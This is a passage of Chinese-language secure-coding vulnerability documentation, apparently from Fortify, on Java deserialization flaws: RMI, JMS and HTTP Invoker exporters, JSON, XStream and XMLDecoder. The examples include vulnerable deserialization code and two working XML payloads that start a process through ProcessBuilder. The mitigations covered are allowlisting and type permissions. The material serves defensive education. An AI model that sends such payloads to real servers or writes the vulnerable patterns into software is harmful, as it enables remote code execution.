<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe Deserialization"></a>Dynamic Code Evaluation: Unsafe Deserialization</h4><h5 id="ABSTRACT-274"><a href="#ABSTRACT-274" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时对用户控制的对象流进行反序列化，会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致 Denial of Service。</p>
<h5 id="EXPLANATION-275"><a href="#EXPLANATION-275" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 序列化会将对象图转换为字节流（包含对象本身和必要的元数据），以便通过字节流进行重构。开发人员可以创建自定义代码，以协助 Java 对象反序列化过程，在此期间，他们甚至可以使用其他对象或代理替代反序列化对象。在对象重构过程中，并在对象返回至应用程序并转换为预期的类型之前，会执行自定义反序列化过程。到开发人员尝试强制执行预期的类型时，代码可能已被执行。</p>
<p>在必须存在于运行时类路径中且无法由攻击者注入的可序列化类中，会自定义反序列化例程，所以这些攻击的可利用性取决于应用程序环境中的可用类。令人遗憾的是，常用的第三方类，甚至 JDK 类都可以被滥用，导致 JVM 资源耗尽、部署恶意文件或运行任意代码。</p>
<p>某些 Spring 服务导出工具会在传输层后台使用 Java 序列化。这些服务的示例包括 RMI、JMSInvoker 和 HTTPInvoker。</p>
<p>例 1： RMIServiceExporter 暴露 TestService 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;testService&quot; class=&quot;example.TestServiceImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean class=&quot;org.springframework.remoting.rmi.RmiServiceExporter&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;serviceName&quot; value=&quot;TestService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;service&quot; ref=&quot;testService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;serviceInterface&quot; value=&quot;example.TestService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;registryPort&quot; value=&quot;1199&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>例 2： JMSInvokerServiceExporter 暴露 TestService 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;testService&quot; class=&quot;example.TestServiceImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean class=&quot;org.springframework.jms.remoting.JmsInvokerServiceExporter&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;serviceInterface&quot; value=&quot;example.TestService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;service&quot; ref=&quot;testService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>例 3： HTTPInvokerServiceExporter 暴露 TestService 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;testService&quot; class=&quot;example.TestServiceImpl&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean class=&quot;org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;serviceInterface&quot; value=&quot;example.TestService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;service&quot; ref=&quot;testService&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-274"><a href="#RECOMMENDATIONS-274" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证对象流的内容的情况下，请勿对不可信数据进行反序列化。为了验证要进行反序列化的类，应使用前瞻反序列化模式。</p>
<p>对象流首先将包含类描述元数据，然后包含其成员字段的序列化字节。Java 序列化过程允许开发人员读取类描述，并确定是继续进行对象的反序列化还是中止对象的反序列化。为此，需要在应执行类验证和确认的位置，子类化 java.io.ObjectInputStream 并提供 resolveClass(ObjectStreamClass desc) 方法的自定义实现。</p>
<p>在这种情况下，理想的方法是将预期的类加入白名单，但在某些情况下，此方法不一定可行。对于复杂的对象图结构，黑名单方法更适合。请谨记，尽管用于执行代码的某些类已公开，但是还可能存在其他未知或未公开的类，因此，白名单方法始终都是首选方法。为避免 Denial of Service，建议您覆盖 resolveObject(Object obj) 方法，以便计算要进行反序列化的对象数量，并在超过阈值时中止反序列化。</p>
<p>在库或框架（例如，使用 JMX、RMI、JMS、HTTP Invoker 时）中执行反序列化时，上述建议并不适用，因为它超出了开发人员的控制范围。在这些情况下，您可能需要确保这些协议满足以下要求：</p>
<ul>
<li><p>未公开披露。</p>
</li>
<li><p>使用身份验证。</p>
</li>
<li><p>使用完整性检查。</p>
</li>
<li><p>使用加密。</p>
</li>
</ul>
<p>此外，每当应用程序通过 ObjectInputStream 执行反序列化时，Fortify Runtime（Fortify 运行时）都会提供要强制执行的安全控制，以此同时保护应用程序代码以及库和框架代码，防止遭到此类攻击。</p>
<h5 id="REFERENCES-273"><a href="#REFERENCES-273" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Fortify Application Defender</p>
<p>[2] Oracle Java Serialization</p>
<p>[3] IBM Look-ahead Java deserialization</p>
<p>[4] OWASP Deserialization of untrusted data</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[6] Standards Mapping - FIPS200 SI</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[19] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-JSON-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-JSON-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe JSON Deserialization"></a>Dynamic Code Evaluation: Unsafe JSON Deserialization</h4><h5 id="ABSTRACT-275"><a href="#ABSTRACT-275" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>对用户控制的 Json 流进行反序列化，可能让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致拒绝服务。</p>
<h5 id="EXPLANATION-276"><a href="#EXPLANATION-276" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将对象图转换为 Json 格式数据的 Json 序列化库可能包括重新从 Json 流重构对象所需的元数据。如果攻击者可以指定要重构的对象类，并能够强制应用程序运行具有用户控制数据的任意资源库，则在 Json 流的反序列化期间他们也许能够执行任意代码。</p>
<h5 id="RECOMMENDATIONS-275"><a href="#RECOMMENDATIONS-275" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证 Json 流的内容的情况下，请勿对不受信任的数据进行反序列化。根据所用的 Json 库，也许可以将反序列化过程中构造的类列入白名单。</p>
<h5 id="REFERENCES-274"><a href="#REFERENCES-274" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[2] Standards Mapping - FIPS200 SI</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[15] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-XStream-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-XStream-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe XStream Deserialization"></a>Dynamic Code Evaluation: Unsafe XStream Deserialization</h4><h5 id="ABSTRACT-276"><a href="#ABSTRACT-276" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时，反序列化用户控制的 XML 文档，会让攻击者有机会在服务器上执行任意恶意代码。</p>
<h5 id="EXPLANATION-277"><a href="#EXPLANATION-277" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>XStream 库为开发者提供了传输对象到 XML 文档中，然后对这些对象进行序列化处理的简单方法。但默认情况下，XStream 可以对动态代理进行反序列化，这样，攻击者就可以在调用代理的 InvocationHandler 时，在服务器上运行任意 Java 代码。</p>
<p>示例 1：以下 Java 代码显示了 XStream 处理不可信赖输入的实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = new XStream();</span><br><span class="line"></span><br><span class="line">String body = IOUtils.toString(request.getInputStream(), &quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">Contact expl = (Contact) xstream.fromXML(body);</span><br></pre></td></tr></table></figure>
<p>示例 2：以下 XML 文档将执行 ProcessBuilder 对象实例化，并调用其静态 start() 方法以运行 Windows 计算器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dynamic-proxy&gt;</span><br><span class="line"></span><br><span class="line">&lt;interface&gt;com.company.model.Contact&lt;/interface&gt;</span><br><span class="line"></span><br><span class="line">&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/target&gt;</span><br><span class="line"></span><br><span class="line">    &lt;action&gt;start&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">&lt;/handler&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dynamic-proxy&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-276"><a href="#RECOMMENDATIONS-276" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>XStream 间接阻止攻击者对已知错误类（例如 java.beans.EventHandler）进行反序列化，并进而使用反序列化运行任意命令。此外，从 XStream 1.4.7 开始，可以定义类型权限。这些权限用于直接允许或拒绝要进行反序列化的类型，因此无法将非预期的类型注入对象图。对外部源数据进行反序列化的任何应用程序都应该使用此功能，以限制执行任意命令的危险性。由于许多类可用于执行远程代码并绕过黑名单，因此请始终使用白名单方法（允许的类型）。</p>
<p>示例 3：以下 Java 代码显示了 XStream 通过定义允许的类型安全处理不可信赖输入的实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = new XStream();</span><br><span class="line"></span><br><span class="line">// clear out existing permissions and set own ones</span><br><span class="line"></span><br><span class="line">xstream.addPermission(NoPermissionType.NONE);</span><br><span class="line"></span><br><span class="line">// allow some basics</span><br><span class="line"></span><br><span class="line">xstream.addPermission(NullPermission.NULL);</span><br><span class="line"></span><br><span class="line">xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);</span><br><span class="line"></span><br><span class="line">xstream.allowTypeHierarchy(Collection.class);</span><br><span class="line"></span><br><span class="line">// allow any type from the same package</span><br><span class="line"></span><br><span class="line">xstream.allowTypesByWildcard(new String[] &#123;</span><br><span class="line"></span><br><span class="line">    Contact.class.getPackage().getName()+&quot;.*&quot;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">String body = IOUtils.toString(request.getInputStream(), &quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">Contact expl = (Contact) xstream.fromXML(body);</span><br></pre></td></tr></table></figure>
<p>请注意，应审计白名单中允许的任何类，以确保对其进行反序列化是安全的。</p>
<p>如果使用 XStream 作为 Spring 项目的封送解决方案，请使用“converters”属性设置自定义转换器链，该链从 org.springframework.oxm.xstream.CatchAllConverter 转换器开始，如以下示例所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;marshallingHttpMessageConverter&quot; class=&quot;org.springframework.http.converter.xml.MarshallingHttpMessageConverter&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;marshaller&quot; ref=&quot;xstreamMarshaller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;unmarshaller&quot; ref=&quot;xstreamMarshaller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;bean id=&quot;xstreamMarshaller&quot; class=&quot;org.springframework.oxm.xstream.XStreamMarshaller&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;aliases&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;props&gt;</span><br><span class="line"></span><br><span class="line">            &lt;prop key=&quot;contact&quot;&gt;org.company.converters.Contact&lt;/prop&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/props&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;converters&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;list&gt;</span><br><span class="line"></span><br><span class="line">            &lt;bean class=&quot;org.springframework.oxm.xstream.CatchAllConverter&quot;/&gt;</span><br><span class="line"></span><br><span class="line">            &lt;bean class=&quot;org.company.converters.ContactConverter&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-275"><a href="#REFERENCES-275" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Dynamic-Code-Evaluation-XMLDecoder-Injection"><a href="#Dynamic-Code-Evaluation-XMLDecoder-Injection" class="headerlink" title="Dynamic Code Evaluation: XMLDecoder Injection"></a>Dynamic Code Evaluation: XMLDecoder Injection</h4><h5 id="ABSTRACT-277"><a href="#ABSTRACT-277" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时，反序列化用户控制的 XML 文档，会让攻击者有机会在服务器上执行任意恶意代码。</p>
<h5 id="EXPLANATION-278"><a href="#EXPLANATION-278" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>JDK XMLEncoder 和 XMLDecoder 类为开发人员提供了保留对象、将对象序列化为 XML 文档的简单方法。但是 XMLEncoder 也会允许开发人员对方法调用进行序列化，如果攻击者能够提供可由 XMLDecoder 反序列化的 XML 文档，那么他就可以在服务器上执行任意代码。</p>
<p>示例：以下 Java 代码显示了 XMLDecoder 处理不可信赖输入的实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XMLDecoder decoder = new XMLDecoder(new InputSource(new InputStreamReader(request.getInputStream(), &quot;UTF-8&quot;)));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Object object = decoder.readObject();</span><br><span class="line"></span><br><span class="line">decoder.close();</span><br></pre></td></tr></table></figure>
<p>示例：以下 XML 文档会实例化 ProcessBuilder 对象，并调用其静态 start() 方法以运行 Windows 计算器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;java&gt;</span><br><span class="line"></span><br><span class="line">  &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot; &gt;</span><br><span class="line"></span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;string&gt;c:\\windows\\system32\\calc.exe&lt;/string&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/void&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/array&gt;</span><br><span class="line"></span><br><span class="line">    &lt;void method=&quot;start&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/object&gt;</span><br><span class="line"></span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-277"><a href="#RECOMMENDATIONS-277" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>令人遗憾的是，无法避免在 XMLDecoder 反序列化过程中执行代码。请勿将 XMLDecoder 与由用户控制的数据一起使用，但如果没有其他替代方法，那么请运行强验证例程，以避免恶意负载。</p>
<h5 id="REFERENCES-276"><a href="#REFERENCES-276" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oracle Oracle official documentation for XMLDecoder</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 502</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
